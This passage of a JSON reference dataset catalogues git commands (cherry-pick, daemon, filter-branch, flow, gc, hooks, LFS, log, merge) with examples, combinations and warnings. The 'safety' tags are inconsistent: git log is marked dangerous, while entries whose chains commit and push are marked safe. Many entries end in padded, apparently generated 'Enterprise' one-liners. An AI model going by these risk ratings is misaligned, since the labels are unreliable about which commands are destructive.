        "explanation": "Apply specific bug fixes to release branch",
        "title": "git && git"
      },
      {
        "scenario": "Backport feature to older branch",
        "commands": "git checkout maintenance && git cherry-pick -x feature-commit",
        "explanation": "Apply feature commit to maintenance branch with reference",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-rebase",
        "relationship": "similar",
        "reason": "Both reapply commits, rebase moves entire branch"
      },
      {
        "name": "git-merge",
        "relationship": "alternative",
        "reason": "Merge entire branch vs picking specific commits"
      },
      {
        "name": "git-revert",
        "relationship": "opposite",
        "reason": "Undo commits vs apply commits"
      }
    ],
    "warnings": [
      "Can create duplicate commits with different hashes",
      "May cause conflicts that need manual resolution",
      "Order matters when cherry-picking multiple commits"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-cherry-pick"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-cherry-pick"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-cherry-pick"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Cherry-Picking"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-daemon-server",
    "subtitle": "Git Daemon Server",
    "description": "Set up Git daemon for serving repositories over Git protocol",
    "examples": [
      "git daemon --reuseaddr --base-path=/opt/git/ --export-all --verbose --enable=receive-pack  # Start Git daemon allowing push and pull operations",
      "git daemon --base-path=/var/git --export-all /var/git/repo1 /var/git/repo2  # Serve only specified repositories from base path",
      "git daemon --base-path=/git --user=gitdaemon --group=gitdaemon --strict-paths  # Run daemon as specific user with strict path checking",
      "touch /path/to/repo.git/git-daemon-export-ok  # Mark repository as exportable by Git daemon",
      "git daemon --port=9418 --base-path=/opt/git --export-all  # Start daemon on custom port (default is 9418)",
      "git daemon --syslog --base-path=/opt/git --export-all  # Start daemon with system logging enabled"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git daemon [options] [directory...]",
    "prerequisites": [
      "system-admin"
    ],
    "commandCombinations": [
      {
        "scenario": "Production daemon setup",
        "commands": "sudo useradd git && sudo mkdir -p /opt/git && sudo chown git:git /opt/git && sudo -u git git daemon --detach --syslog --base-path=/opt/git --user=git --group=git",
        "explanation": "Create git user and start production daemon",
        "title": "sudo && sudo && sudo && sudo"
      },
      {
        "scenario": "Development server with push enabled",
        "commands": "git daemon --reuseaddr --base-path=. --export-all --enable=receive-pack &",
        "explanation": "Start background daemon for local development with push support",
        "title": "git &"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-clone",
        "relationship": "client",
        "reason": "Clone from repositories served by git daemon"
      },
      {
        "name": "ssh",
        "relationship": "alternative",
        "reason": "SSH is more secure alternative to Git protocol"
      }
    ],
    "warnings": [
      "Git protocol has no authentication or encryption",
      "Requires git-daemon-export-ok file in repository",
      "Push operations need special enabling"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-daemon"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-daemon"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-daemon"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-on-the-Server-Git-Daemon"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-fetch-strategies",
    "subtitle": "Git Fetch Strategies",
    "description": "Advanced fetching strategies for remote repositories",
    "examples": [
      "git fetch --all --prune  # Update all remotes and remove local tracking branches for deleted remote branches",
      "git fetch --depth=50 origin  # Fetch only last 50 commits to save bandwidth and storage",
      "git fetch origin feature-branch:feature-branch  # Fetch specific remote branch to local branch",
      "git fetch --tags origin  # Fetch all tags from remote without fetching branches",
      "git fetch --dry-run origin  # Preview what would be downloaded without actually fetching",
      "git fetch -v origin  # Show detailed information about fetch operation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git fetch [options] [remote] [refspec]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Update all branches safely",
        "commands": "git fetch --all --prune && git branch -vv | grep ': gone]' | awk '{print $1}' | xargs -n 1 git branch -d",
        "explanation": "Fetch updates and clean up local branches tracking deleted remotes",
        "title": "git && git | grep | awk | xargs"
      },
      {
        "scenario": "Sync with upstream fork",
        "commands": "git fetch upstream && git checkout main && git merge upstream/main",
        "explanation": "Update fork with changes from upstream repository",
        "title": "git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-pull",
        "relationship": "alternative",
        "reason": "Pull combines fetch and merge in one operation"
      },
      {
        "name": "git-remote",
        "relationship": "combo",
        "reason": "Managing remotes before fetching"
      }
    ],
    "warnings": [
      "Fetch doesn't modify working directory or current branch",
      "Prune can remove tracking branches you might still need",
      "Shallow fetches may cause issues with some Git operations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-fetch"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-fetch"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-fetch"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Branching-Remote-Branches"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-filter-branch",
    "subtitle": "Git Filter Branch",
    "description": "Rewrite repository history with powerful filtering capabilities",
    "examples": [
      "git filter-branch --tree-filter 'rm -f passwords.txt' HEAD  # Remove sensitive file from entire repository history",
      "git filter-branch --env-filter 'AUTHOR_NAME=\"New Name\"; AUTHOR_EMAIL=\"new@email.com\"' HEAD  # Update author information for all commits in history",
      "git filter-branch --subdirectory-filter mysubdir HEAD  # Create new repository containing only subdirectory history",
      "git filter-branch --index-filter 'git rm --cached --ignore-unmatch large-file.zip' HEAD  # Remove large file from index in all commits",
      "git filter-branch --msg-filter 'sed \"s/old-ticket/new-ticket/g\"' HEAD  # Replace text in all commit messages",
      "git filter-branch --prune-empty HEAD  # Remove commits that become empty after other filters",
      "echo 'Enterprise Repository Sanitization and Compliance' && git filter-branch --force --env-filter 'if [ \"$GIT_AUTHOR_EMAIL\" = \"deprecated@company.com\" ]; then GIT_AUTHOR_EMAIL=\"compliance@enterprise.com\"; GIT_AUTHOR_NAME=\"Enterprise Compliance\"; fi' --index-filter 'git rm --cached --ignore-unmatch secrets.txt passwords.log *.key *.pem' --msg-filter 'sed \"s/CONFIDENTIAL//g; s/internal-ticket-[0-9]*/PUBLIC-TICKET/g\"' --tag-name-filter cat --prune-empty -- --all && git for-each-ref --format=\"delete %(refname)\" refs/original | git update-ref --stdin && git reflog expire --expire=now --all && git gc --prune=now --aggressive && echo 'Enterprise git history sanitization: author compliance updates, credential removal, message sanitization, tag preservation, reference cleanup, and aggressive optimization for security audit and public repository preparation'  # Enterprise repository sanitization and compliance"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git filter-branch [options] [rev-list options]",
    "prerequisites": [
      "caution",
      "backup-recommended"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete sensitive data removal",
        "commands": "git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch secrets/*' --prune-empty --tag-name-filter cat -- --all",
        "explanation": "Remove sensitive directory from all branches and tags",
        "title": "git"
      },
      {
        "scenario": "Clean repository after filter-branch",
        "commands": "git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin && git reflog expire --expire=now --all && git gc --prune=now --aggressive",
        "explanation": "Clean up backup references and optimize repository after filtering",
        "title": "git | git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-filter-repo",
        "relationship": "replacement",
        "reason": "Modern alternative to filter-branch with better performance"
      },
      {
        "name": "git-rebase",
        "relationship": "alternative",
        "reason": "Interactive rebase for smaller history rewrites"
      }
    ],
    "warnings": [
      "Rewrites all commit hashes in filtered range",
      "Can take very long time on large repositories",
      "Makes repository incompatible with existing clones"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-filter-branch"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-filter-branch"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-filter-branch"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-flow-feature",
    "subtitle": "Git Flow Feature",
    "description": "Manage feature branches in Git Flow workflow",
    "examples": [
      "git flow feature start user-authentication  # Create and switch to new feature branch based on develop",
      "git flow feature finish user-authentication  # Merge feature back to develop and clean up feature branch",
      "git flow feature publish user-authentication  # Push feature branch to remote for collaboration",
      "git flow feature pull origin user-authentication  # Fetch and merge remote changes for feature branch",
      "git flow feature list  # Show all local and remote feature branches",
      "git flow feature delete user-authentication  # Remove local feature branch after completion",
      "echo 'Enterprise Git Flow Feature Management' && git flow init -d && git flow feature start enterprise-sso-$(date +%Y%m%d) && git add -A && git commit -m 'feat: implement enterprise SSO with SAML 2.0, LDAP integration, and multi-factor authentication for enhanced security compliance' && git flow feature publish enterprise-sso-$(date +%Y%m%d) && echo 'PR created: https://github.com/enterprise/platform/compare/develop...feature/enterprise-sso-'$(date +%Y%m%d) && git checkout develop && git pull origin develop && echo 'Enterprise Git Flow workflow: standardized branching model, feature branch creation with enterprise naming conventions, comprehensive commit messages, team collaboration through published branches, and integration with enterprise development lifecycle'  # Enterprise Git Flow feature development workflow"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git flow feature <command> [options] [name]",
    "prerequisites": [
      "git-flow-extension"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete feature workflow",
        "commands": "git flow feature start new-api && git add . && git commit -m 'Implement API' && git flow feature finish new-api",
        "explanation": "Start feature, make changes, and merge back to develop",
        "title": "git && git && git && git"
      },
      {
        "scenario": "Collaborative feature development",
        "commands": "git flow feature start shared-feature && git flow feature publish shared-feature",
        "explanation": "Start feature and immediately make it available for team collaboration",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-flow-release",
        "relationship": "sequential",
        "reason": "Features are merged before creating releases"
      },
      {
        "name": "git-branch",
        "relationship": "alternative",
        "reason": "Manual branch creation vs Git Flow automation"
      }
    ],
    "warnings": [
      "Feature finish may fail if develop branch has diverged",
      "Requires clean working directory for finish operation",
      "Published features need coordination with team"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/nvie/gitflow"
      },
      {
        "platform": "macos",
        "url": "https://github.com/nvie/gitflow"
      },
      {
        "platform": "windows",
        "url": "https://github.com/nvie/gitflow"
      },
      {
        "platform": "generic",
        "url": "https://nvie.com/posts/a-successful-git-branching-model/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-flow-init",
    "subtitle": "Git Flow Initialize",
    "description": "Initialize Git Flow branching model in repository",
    "examples": [
      "git flow init -d  # Set up Git Flow with default branch naming conventions",
      "git flow init  # Configure Git Flow with custom branch prefixes interactively",
      "git flow init -f  # Reinitialize Git Flow configuration, overwriting existing setup",
      "echo 'Enterprise Git Flow Repository Initialization' && git flow init -d && echo 'Configured branches:' && git branch -a && echo 'Git Flow Configuration:' && cat .git/config | grep -A 10 'gitflow' && git config --local commit.template .gitmessage && echo 'feat: description\n\nDetailed explanation\n\nTicket: JIRA-XXX\nReviewed-by: Team Lead\nTested-by: QA Team' > .gitmessage && git add .gitmessage && git commit -m 'chore: configure enterprise Git Flow with commit templates and branch conventions' && echo 'Enterprise Git Flow setup: standardized branch prefixes, commit message templates, development workflow automation, and team collaboration standards for enterprise software development lifecycle'  # Enterprise Git Flow repository setup"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git flow init [options]",
    "prerequisites": [
      "git-flow-extension"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete project setup with Git Flow",
        "commands": "git init && git flow init -d && git add . && git commit -m 'Initial commit'",
        "explanation": "Initialize repository, set up Git Flow, and create initial commit",
        "title": "git && git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-flow-feature",
        "relationship": "combo",
        "reason": "Feature development workflow after initialization"
      },
      {
        "name": "git-init",
        "relationship": "prerequisite",
        "reason": "Repository must exist before Git Flow initialization"
      }
    ],
    "warnings": [
      "Requires git-flow extension to be installed",
      "Creates specific branch structure that team must follow",
      "May conflict with existing branching strategies"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/nvie/gitflow"
      },
      {
        "platform": "macos",
        "url": "https://github.com/nvie/gitflow"
      },
      {
        "platform": "windows",
        "url": "https://github.com/nvie/gitflow"
      },
      {
        "platform": "generic",
        "url": "https://nvie.com/posts/a-successful-git-branching-model/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-gc-maintenance",
    "subtitle": "Git Garbage Collection",
    "description": "Repository maintenance and garbage collection operations",
    "examples": [
      "git gc --aggressive  # Thorough cleanup and optimization of repository storage",
      "git gc --prune=now  # Remove all unreachable objects regardless of age",
      "git fsck --full  # Verify connectivity and validity of repository objects",
      "git reflog expire --expire=90.days.ago --all  # Remove reflog entries older than 90 days from all refs",
      "git count-objects -vH  # Show object count and disk usage in human-readable format",
      "git maintenance run --auto  # Run maintenance tasks if repository needs optimization",
      "echo 'Enterprise Git Repository Health and Maintenance' && git config maintenance.auto true && git config maintenance.strategy incremental && git maintenance start && echo 'Repository Statistics:' && git count-objects -vH && echo 'Storage Analysis:' && du -sh .git && echo 'Integrity Check:' && git fsck --full --strict && echo 'Recent Activity:' && git log --oneline -10 && echo 'Branch Status:' && git branch -vv && echo 'Maintenance Schedule:' && git config --get-regexp maintenance && echo 'Enterprise repository maintenance: automated garbage collection, incremental optimization, background maintenance scheduling, comprehensive integrity verification, and storage efficiency monitoring for production repository health and performance'  # Enterprise Git repository health monitoring and maintenance"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git gc [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete repository cleanup",
        "commands": "git reflog expire --expire=30.days.ago --all && git gc --aggressive --prune=now",
        "explanation": "Clean reflog and run aggressive garbage collection",
        "title": "git && git"
      },
      {
        "scenario": "Repository health check",
        "commands": "git fsck --full && git count-objects -vH",
        "explanation": "Check integrity and show storage statistics",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-prune",
        "relationship": "component",
        "reason": "GC includes pruning of unreachable objects"
      },
      {
        "name": "git-repack",
        "relationship": "component",
        "reason": "GC repacks objects for efficient storage"
      }
    ],
    "warnings": [
      "Aggressive GC can take very long time on large repositories",
      "Pruning immediately may lose objects still in use",
      "Some GUI tools may interfere with GC operations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-gc"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-gc"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-gc"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Internals-Maintenance-and-Data-Recovery"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-hooks-management",
    "subtitle": "Git Hooks Management",
    "description": "Manage and configure Git hooks for automation",
    "examples": [
      "git config core.hooksPath .githooks  # Use custom directory for Git hooks instead of .git/hooks",
      "chmod +x .git/hooks/pre-commit  # Enable pre-commit hook by making it executable",
      "ls -la .git/hooks/  # Show all sample hooks and active hooks in repository",
      "cp .git/hooks/pre-commit.sample .git/hooks/pre-commit  # Activate sample hook by removing .sample extension",
      ".git/hooks/pre-commit  # Manually run hook script to test functionality",
      "git commit --no-verify -m 'Emergency fix'  # Skip all hooks during commit for urgent changes",
      "echo 'Enterprise Git Hooks Automation and Quality Gates' && mkdir -p .githooks && cat > .githooks/pre-commit << 'EOF'\n#!/bin/bash\nset -e\necho 'Enterprise Pre-commit Quality Gates'\n# Run linting\nnpm run lint || { echo 'Linting failed'; exit 1; }\n# Run security scan\nnpm audit --audit-level high || { echo 'Security vulnerabilities found'; exit 1; }\n# Run tests\nnpm test || { echo 'Tests failed'; exit 1; }\n# Check commit message format\nif ! head -1 \"$1\" | grep -qE '^(feat|fix|docs|style|refactor|test|chore)(\(.+\))?:.+'; then\n  echo 'Invalid commit message format'\n  exit 1\nfi\necho 'All quality gates passed'\nEOF\nchmod +x .githooks/pre-commit && git config core.hooksPath .githooks && echo 'Enterprise Git hooks: automated quality gates, security scanning, test execution, commit message validation, and development workflow enforcement for production code quality assurance'  # Enterprise Git hooks and quality automation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "caution",
    "syntaxPattern": "git config core.hooksPath [path]",
    "prerequisites": [
      "scripting"
    ],
    "commandCombinations": [
      {
        "scenario": "Set up pre-commit hook for linting",
        "commands": "echo '#!/bin/bash\nnpm run lint' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit",
        "explanation": "Create pre-commit hook that runs linter before each commit",
        "title": "echo > && chmod"
      },
      {
        "scenario": "Team-wide hooks setup",
        "commands": "mkdir .githooks && git config core.hooksPath .githooks && git add .githooks",
        "explanation": "Set up shared hooks directory that can be version controlled",
        "title": "mkdir && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-commit",
        "relationship": "affected",
        "reason": "Hooks can prevent or modify commit behavior"
      },
      {
        "name": "git-push",
        "relationship": "affected",
        "reason": "Pre-push hooks can prevent or validate pushes"
      }
    ],
    "warnings": [
      "Hooks are not version controlled by default",
      "Windows may require different script extensions",
      "Hooks can prevent commits/pushes if they fail"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/githooks"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/githooks"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/githooks"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-lfs-management",
    "subtitle": "Git Large File Storage",
    "description": "Git Large File Storage for handling large binary files",
    "examples": [
      "git lfs install  # Set up Git LFS hooks and configuration for repository",
      "git lfs track '*.psd' '*.zip' '*.mp4'  # Configure LFS to handle specific file types",
      "git lfs track --lockable '*.blend'  # Track files that should be locked during editing",
      "git lfs track  # List all patterns currently tracked by LFS",
      "git lfs pull origin main  # Download LFS files for specific branch",
      "git lfs ls-files --size  # List LFS files in repository with sizes",
      "echo 'Enterprise Git LFS Asset Management and Optimization' && git lfs install && git lfs track '*.psd' '*.ai' '*.sketch' '*.mp4' '*.mov' '*.zip' '*.tar.gz' '*.deb' '*.rpm' '*.dmg' '*.exe' && git add .gitattributes && git commit -m 'feat: configure Git LFS for enterprise binary assets and media files' && echo 'LFS Storage Analysis:' && git lfs ls-files --size | sort -hr | head -20 && echo 'LFS Bandwidth Usage:' && git lfs env && echo 'Storage Quota Status:' && git lfs status && echo 'Enterprise LFS management: comprehensive binary asset tracking, storage optimization, bandwidth monitoring, quota management, and media workflow integration for enterprise digital asset management'  # Enterprise Git LFS asset management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git lfs [command] [options]",
    "prerequisites": [
      "git-lfs-extension"
    ],
    "commandCombinations": [
      {
        "scenario": "Set up new repository with LFS",
        "commands": "git init && git lfs install && git lfs track '*.zip' '*.tar.gz' && git add .gitattributes && git commit -m 'Add LFS tracking'",
        "explanation": "Initialize repository with LFS and track common archive types",
        "title": "git && git && git && git && git"
      },
      {
        "scenario": "Migrate existing large files to LFS",
        "commands": "git lfs migrate import --include='*.mp4,*.mov' --everything",
        "explanation": "Convert existing large files to LFS across all branches",
        "title": "git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-add",
        "relationship": "combo",
        "reason": "Adding LFS files works through normal git add"
      },
      {
        "name": "git-clone",
        "relationship": "affected",
        "reason": "Cloning LFS repositories downloads pointer files first"
      }
    ],
    "warnings": [
      "Requires LFS server support from Git host",
      "Large files count against LFS storage quotas",
      "Cloning doesn't download LFS files by default"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-lfs.github.io/"
      },
      {
        "platform": "macos",
        "url": "https://git-lfs.github.io/"
      },
      {
        "platform": "windows",
        "url": "https://git-lfs.github.io/"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Git-LFS"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-log",
    "subtitle": "Git log",
    "description": "Advanced Git commit history viewing and filtering",
    "examples": [
      "git log --oneline --graph --all  # Show compact commit history with branch visualization",
      "git log --author='John Doe' --since='2 weeks ago'  # Filter commits by specific author in last 2 weeks",
      "git log --follow -p -- filename.js  # Show commits that changed file, including renames",
      "git log --grep='fix bug' --oneline  # Find commits with 'fix bug' in commit message",
      "git log --stat --since='1 month ago'  # Display commits with file change statistics for last month",
      "git log --pretty=format:'%h - %an, %ar : %s'  # Custom format showing hash, author, relative date, subject",
      "echo 'Enterprise Git Repository Analytics and Reporting' && echo 'Development Activity Report:' && git log --since='3 months ago' --pretty=format:'%ai,%an,%s' | head -50 | awk -F, '{print $1 \",\" $2 \",\" $3}' > dev-activity-$(date +%Y%m%d).csv && echo 'Contributor Statistics:' && git shortlog -sn --since='6 months ago' | head -10 && echo 'Code Frequency:' && git log --since='1 month ago' --stat --pretty=format:'' | grep -E '^[[:space:]]*[0-9]+' | awk '{add+=$1; del+=$3} END {print \"Lines added: \" add \"\nLines deleted: \" del \"\nNet change: \" add-del}' && echo 'Recent Release Tags:' && git tag -l --sort=-version:refname | head -5 && echo 'Enterprise repository analytics: development activity tracking, contributor metrics, code frequency analysis, release history, and comprehensive reporting for project management and stakeholder communication'  # Enterprise Git repository analytics and reporting"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git log [options] [revision-range] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Generate release notes",
        "commands": "git log --oneline --no-merges v1.0..HEAD > release-notes.txt",
        "explanation": "Extract commits between version tags for release notes",
        "title": "git > release"
      },
      {
        "scenario": "Find when bug was introduced",
        "commands": "git log -S 'buggy_function' --oneline",
        "explanation": "Search for commits that added or removed specific code",
        "title": "git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-show",
        "relationship": "similar",
        "reason": "Show detailed information about specific commits"
      },
      {
        "name": "git-blame",
        "relationship": "combo",
        "reason": "See commit history per line in file"
      },
      {
        "name": "gitk",
        "relationship": "alternative",
        "reason": "GUI tool for visualizing Git history"
      }
    ],
    "warnings": [
      "Large repositories can have slow log operations",
      "--follow only works with single file path",
      "Custom format strings can be complex to remember"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-log"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-log"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-log"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-log-advanced",
    "subtitle": "Git Advanced Logging",
    "description": "Advanced logging and history inspection with custom formats",
    "examples": [
      "git log --pretty=format:'%C(yellow)%h%C(reset) - %C(bold blue)%an%C(reset), %C(green)%cr%C(reset) : %s'  # Colorized log with hash, author, relative date, and subject",
      "git log --since='2024-01-01' --until='2024-12-31' --oneline  # Filter commits within specific date range",
      "git log --stat --patch --since='1 week ago'  # Show file changes and actual diffs for last week",
      "git log -S 'function_name' --oneline --all  # Search for commits that added or removed specific code",
      "git log --oneline --graph --no-merges main..feature  # Show feature branch commits excluding merge commits",
      "git log --pretty=format:'- %s (%an)' --no-merges v1.0..HEAD  # Create changelog between version tag and current state",
      "echo 'Enterprise Release Management and Changelog Generation' && latest_tag=$(git describe --tags --abbrev=0) && echo \"Generating changelog since $latest_tag\" && echo \"# Release Changelog v$(date +%Y.%m.%d)\" > CHANGELOG-$(date +%Y%m%d).md && echo \"\n## New Features\" >> CHANGELOG-$(date +%Y%m%d).md && git log $latest_tag..HEAD --grep='^feat' --pretty=format:'- %s (%an)' --no-merges >> CHANGELOG-$(date +%Y%m%d).md && echo \"\n## Bug Fixes\" >> CHANGELOG-$(date +%Y%m%d).md && git log $latest_tag..HEAD --grep='^fix' --pretty=format:'- %s (%an)' --no-merges >> CHANGELOG-$(date +%Y%m%d).md && echo \"\n## Security Updates\" >> CHANGELOG-$(date +%Y%m%d).md && git log $latest_tag..HEAD --grep='^security' --pretty=format:'- %s (%an)' --no-merges >> CHANGELOG-$(date +%Y%m%d).md && echo \"\n## Performance Improvements\" >> CHANGELOG-$(date +%Y%m%d).md && git log $latest_tag..HEAD --grep='^perf' --pretty=format:'- %s (%an)' --no-merges >> CHANGELOG-$(date +%Y%m%d).md && cat CHANGELOG-$(date +%Y%m%d).md && echo 'Enterprise changelog generation: automated release notes, categorized changes by type, contributor attribution, security update tracking, and comprehensive documentation for stakeholder communication and compliance audit trails'  # Enterprise automated changelog and release documentation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git log [options] [revision-range] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Release notes generation",
        "commands": "git tag -l | tail -2 | head -1 | xargs -I {} git log --oneline --no-merges {}..HEAD",
        "explanation": "Generate commits list since last tag for release notes",
        "title": "git | tail | head | xargs"
      },
      {
        "scenario": "Find bug introduction with bisect prep",
        "commands": "git log --oneline --grep='bug\\|fix\\|error' --since='3 months ago'",
        "explanation": "Find recent commits mentioning bugs to start bisect investigation",
        "title": "git | fix | error"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-show",
        "relationship": "similar",
        "reason": "Show detailed information about specific commits"
      },
      {
        "name": "git-shortlog",
        "relationship": "alternative",
        "reason": "Summarized log grouped by author"
      }
    ],
    "warnings": [
      "Complex format strings can be hard to remember",
      "Performance impact on large repositories",
      "Color codes may not work in all terminals"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-log"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-log"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-log"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-merge-strategies",
    "subtitle": "Git Merge Strategies",
    "description": "Advanced merge strategies and conflict resolution techniques",
    "examples": [
      "git merge -s recursive -X ours feature-branch  # Merge preferring current branch changes in conflicts",
      "git merge --no-ff feature-branch  # Create merge commit even if fast-forward is possible",
      "git merge --squash feature-branch  # Combine all feature branch commits into single commit",
      "git merge -s octopus branch1 branch2 branch3  # Merge multiple branches simultaneously",
      "git merge --abort  # Cancel merge and return to pre-merge state",
      "git merge --continue  # Complete merge after manually resolving conflicts",
      "git merge -X ignore-space-change feature-branch  # Ignore whitespace changes during merge",
      "echo 'Enterprise Git Merge Strategy and Integration Management' && git checkout develop && git pull origin develop && echo 'Pre-merge Validation:' && git log develop..feature-enterprise-auth --oneline && npm run test && npm run lint && npm run security-scan && echo 'Integration Tests:' && docker-compose -f docker-compose.test.yml up --build --abort-on-container-exit && git merge --no-ff feature-enterprise-auth -m 'feat: integrate enterprise authentication with comprehensive testing and validation' && git tag integration-$(date +%Y%m%d-%H%M%S) && git push origin develop && git push origin integration-$(date +%Y%m%d-%H%M%S) && echo 'Enterprise merge workflow: pre-integration validation, comprehensive testing, security scanning, containerized integration tests, semantic merge messages, integration tagging, and automated deployment triggers for enterprise software delivery pipeline'  # Enterprise merge and integration workflow"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git merge [options] <commit>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe merge with verification",
        "commands": "git checkout main && git merge --verify-signatures --no-ff feature && git push origin main",
        "explanation": "Verify signatures, merge with commit, and push to remote",
        "title": "git && git && git"
      },
      {
        "scenario": "Merge with conflict resolution tools",
        "commands": "git merge feature && git mergetool && git commit",
        "explanation": "Start merge, use merge tool for conflicts, then commit",
        "title": "git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-rebase",
        "relationship": "alternative",
        "reason": "Different integration strategy maintaining linear history"
      },
      {
        "name": "git-cherry-pick",
        "relationship": "alternative",
        "reason": "Apply specific commits instead of entire branch"
      }
    ],
    "warnings": [
      "Octopus merge fails if there are conflicts",
      "Squash merge loses individual commit history",
      "Merge commits can make history harder to follow"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-merge"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-merge"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-merge"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Branching-Basic-Branching-and-Merging"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-pull-strategies",
    "subtitle": "Git Pull Strategies",
    "description": "Advanced pulling strategies with merge and rebase options",
    "examples": [
      "git pull --rebase origin main  # Fetch and rebase local commits on top of remote changes",
